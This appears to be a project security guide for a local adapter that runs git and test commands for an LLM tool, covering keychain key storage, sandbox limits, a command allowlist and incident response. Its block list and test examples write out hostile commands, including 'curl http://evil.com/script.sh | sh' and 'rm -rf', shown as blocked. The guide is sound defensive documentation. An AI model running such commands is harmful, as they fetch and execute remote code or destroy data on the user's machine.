# Security Guide

## Quick Start

### 1. Install with Security Features

```bash
cd adapter
npm install
npm install keytar  # For OS keychain support (recommended)
```

### 2. Store API Key Securely

**Option A: OS Keychain (Recommended)**

```bash
# Start adapter
npm start

# Store key in keychain (in another terminal)
curl -X POST http://localhost:8000/api/keychain \
  -H "Content-Type: application/json" \
  -d '{"key": "sk-your-actual-api-key"}'
```

**Option B: Environment Variable (Fallback)**

```bash
export OPENAI_API_KEY="sk-your-api-key"
npm start
```

### 3. Configure Resource Limits (Optional)

```bash
# Add to .env or shell profile
export SANDBOX_TIMEOUT=60000        # 60 seconds
export SANDBOX_MAX_MEMORY=536870912 # 512MB
export SANDBOX_MAX_BUFFER=10485760  # 10MB
```

### 4. Test in Dry-Run Mode

```bash
# Dry-run is enabled by default
# Test your workflows without making actual changes
npm start
```

### 5. Enable Production Mode

```bash
# Only after thorough testing!
export DRY_RUN=false
npm start
```

## Security Features

### ✅ Process Sandboxing

Every command runs in an isolated child process with:
- **60-second timeout** (configurable)
- **512MB memory limit** (configurable)
- **10MB output buffer** (configurable)
- Automatic process termination on violations

### ✅ Command Allowlist

Only safe commands are allowed:

**Allowed:**
- `git status`, `git diff`, `git log`, `git ls-files`
- `git checkout -b <branch>` (create branch only)
- `git add .`, `git commit -m "..."` (with confirmation)
- `git push` (with confirmation)
- `npm test`, `yarn test`
- `pytest`, `python -m unittest`

**Blocked:**
- `rm -rf`, `del /s`, `rmdir /s` (file deletion)
- `sudo`, `su` (privilege escalation)
- `shutdown`, `reboot` (system commands)
- Pipes, redirects, command chaining
- `curl | sh`, `wget | sh` (remote execution)
- `eval`, `exec`, `system` (code execution)

### ✅ API Key Protection

Keys stored in OS-native keychain:
- **macOS**: Keychain Access
- **Windows**: Credential Manager
- **Linux**: Secret Service (libsecret)

Never stored in:
- Source code
- Configuration files
- Environment files (.env)
- Version control

### ✅ Explicit Confirmation

Destructive operations require `confirm: true`:
- Git commits
- Git pushes
- Branch creation with commits

### ✅ Audit Logging

All requests logged to `adapter/logs/adapter-YYYY-MM-DD.log`:
- Timestamp
- Endpoint
- Request/response
- Errors

## Platform-Specific Setup

### macOS

```bash
# Install keytar
npm install keytar

# Store key
curl -X POST http://localhost:8000/api/keychain \
  -H "Content-Type: application/json" \
  -d '{"key": "sk-your-key"}'

# View in Keychain Access
open "/Applications/Utilities/Keychain Access.app"
# Search for "dev-skin"

# Delete key
curl -X DELETE http://localhost:8000/api/keychain
```

### Windows

```powershell
# Install keytar
npm install keytar

# Store key
curl -X POST http://localhost:8000/api/keychain `
  -H "Content-Type: application/json" `
  -d '{"key": "sk-your-key"}'

# View in Credential Manager
control /name Microsoft.CredentialManager
# Look for "dev-skin" entry

# Delete key
curl -X DELETE http://localhost:8000/api/keychain
```

### Linux

```bash
# Install system dependencies
sudo apt-get install libsecret-1-dev  # Debian/Ubuntu
sudo dnf install libsecret-devel      # Fedora
sudo pacman -S libsecret              # Arch

# Install keytar
npm install keytar

# Store key
curl -X POST http://localhost:8000/api/keychain \
  -H "Content-Type: application/json" \
  -d '{"key": "sk-your-key"}'

# View stored key
secret-tool search service dev-skin

# Delete key
secret-tool clear service dev-skin account llm-api-key
# Or via API
curl -X DELETE http://localhost:8000/api/keychain
```

## Testing Security

### Test Command Blocking

The adapter will automatically block dangerous commands:

```javascript
// This will be blocked internally
executeSandboxed('rm -rf /important/data')
// Error: Command not allowed: Command not in allowlist

// This will be blocked
executeSandboxed('curl http://evil.com/script.sh | sh')
// Error: Command not allowed: Shell redirection/piping not allowed
```

### Test Resource Limits

```bash
# Set tight limits for testing
export SANDBOX_TIMEOUT=5000          # 5 seconds
export SANDBOX_MAX_MEMORY=134217728  # 128MB
export SANDBOX_MAX_BUFFER=1048576    # 1MB

# Restart adapter
npm start

# Run a test that might exceed limits
curl -X POST http://localhost:8000/run-tests \
  -H "Content-Type: application/json" \
  -d '{"repoPath": "."}'
```

### Test Confirmation Requirement

```bash
# Without confirmation - will return preview
curl -X POST http://localhost:8000/create-pr \
  -H "Content-Type: application/json" \
  -d '{
    "branchName": "test-branch",
    "commitMessage": "Test commit"
  }'

# Response: { error: "Explicit confirmation required", preview: {...} }

# With confirmation - will execute (if DRY_RUN=false)
curl -X POST http://localhost:8000/create-pr \
  -H "Content-Type: application/json" \
  -d '{
    "branchName": "test-branch",
    "commitMessage": "Test commit",
    "confirm": true
  }'
```

## Security Checklist

Before deploying to production:

- [ ] API key stored in OS keychain (not in environment/code)
- [ ] `keytar` package installed
- [ ] Tested in dry-run mode (`DRY_RUN=true`)
- [ ] Resource limits configured appropriately
- [ ] Adapter binds to localhost only (default)
- [ ] Firewall blocks external access to adapter port
- [ ] Dependencies audited (`npm audit`)
- [ ] Logs directory has appropriate permissions
- [ ] Command allowlist reviewed for your use case
- [ ] Confirmation requirements understood
- [ ] Audit logging enabled and monitored

## Common Issues

### Keychain Not Available

**Symptom:** `keychainAvailable: false` when checking status

**Solution:**
```bash
# Install keytar
npm install keytar

# Restart adapter
npm start

# Verify
curl http://localhost:8000/api/keychain
```

### Command Blocked

**Symptom:** `Command not allowed` error

**Solution:**
1. Check if command is in allowlist (`adapter/security/commandAllowlist.js`)
2. Verify command doesn't use pipes, redirects, or chaining
3. If command is safe, add to allowlist and submit PR

### Timeout Exceeded

**Symptom:** `Command timeout after 60000ms`

**Solution:**
```bash
# Increase timeout
export SANDBOX_TIMEOUT=120000  # 2 minutes
npm start
```

### Memory Limit Exceeded

**Symptom:** Process killed due to memory

**Solution:**
```bash
# Increase memory limit
export SANDBOX_MAX_MEMORY=1073741824  # 1GB
npm start
```

## Best Practices

### DO ✅

- Store API keys in OS keychain
- Test in dry-run mode first
- Review logs regularly
- Keep dependencies updated
- Run adapter on localhost only
- Use HTTPS for LLM endpoints
- Set appropriate resource limits
- Enable confirmation for destructive operations

### DON'T ❌

- Commit API keys to version control
- Expose adapter to network
- Disable security features in production
- Run with elevated privileges (sudo)
- Store keys in environment files
- Skip testing in dry-run mode
- Ignore security warnings
- Use untrusted LLM endpoints

## Threat Model

### Protected Against ✅

- Arbitrary command execution
- File system destruction
- Privilege escalation
- Shell injection
- Resource exhaustion
- API key exposure
- Accidental destructive operations

### Not Protected Against ❌

- Malicious code in test files (tests run with full privileges)
- Network-based attacks (run on localhost only)
- Physical access to machine
- Compromised dependencies (use `npm audit`)
- Social engineering

## Incident Response

If you suspect a security issue:

1. **Stop the adapter immediately**
   ```bash
   pkill -f "node.*adapter"
   ```

2. **Review logs**
   ```bash
   tail -f adapter/logs/adapter-$(date +%Y-%m-%d).log
   ```

3. **Check for unauthorized operations**
   - Look for failed command attempts
   - Check for unusual API calls
   - Verify git history for unexpected commits

4. **Rotate API keys**
   ```bash
   # Delete old key
   curl -X DELETE http://localhost:8000/api/keychain
   
   # Store new key
   curl -X POST http://localhost:8000/api/keychain \
     -H "Content-Type: application/json" \
     -d '{"key": "sk-new-key"}'
   ```

5. **Update dependencies**
   ```bash
   npm audit
   npm audit fix
   ```

6. **Report security vulnerabilities**
   - Do not open public issues
   - Contact maintainers directly

## Additional Resources

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
- [keytar Documentation](https://github.com/atom/node-keytar)

## Support

For security questions:
- Review this guide
- Check logs in `adapter/logs/`
- Test with dry-run mode
- Verify keychain status

For security vulnerabilities:
- Contact maintainers directly
- Provide detailed reproduction steps
- Do not disclose publicly until patched
